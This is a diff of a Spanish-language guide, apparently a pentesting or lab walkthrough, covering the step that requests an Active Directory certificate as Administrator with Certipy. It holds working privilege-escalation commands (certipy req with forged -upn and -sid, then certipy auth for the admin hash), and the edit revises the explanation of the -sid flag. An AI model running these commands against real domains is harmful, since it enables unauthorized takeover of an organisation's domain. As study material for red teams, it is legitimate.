@@ -52,12 +52,11 @@ Y que un principal de bajos privilegios pueda inscribirse: ACE de `Enroll` para 
 ## 4. Pedir el certificado como Administrator
 
 ```bash
-certipy req -u '<user>@<domain>' -p '<password>' -ca '<CA>' -template '<TEMPLATE>' \
-  -upn 'administrator@<domain>' -sid 'S-1-5-21-<dominio>-500' -dc-ip <DC_IP>
+certipy req -u '<user>@<domain>' -p '<password>' -ca '<CA>' -template '<TEMPLATE>'   -upn 'administrator@<domain>' -sid 'S-1-5-21-<dominio>-500' -dc-ip <DC_IP>
 certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
 ```
 
-`-sid` importa: sin él, el PAC lleva el SID del usuario real y el acceso puede quedar limitado. Con `-500` el certificado es de Administrator de verdad.
+`-sid` no es obligatorio: se usa cuando el `-upn` **no resuelve** al objeto destino (cuenta sin UPN, bosque distinto o UPN inventado) y hay que fijar el SID que llevará el certificado. Si `administrator@<domain>` existe en el dominio, Certipy resuelve el SID por LDAP y el certificado ya es de Administrator; con `-500` fuerzas el RID del Administrator real.
 
 Con el hash o el `ccache`:
 
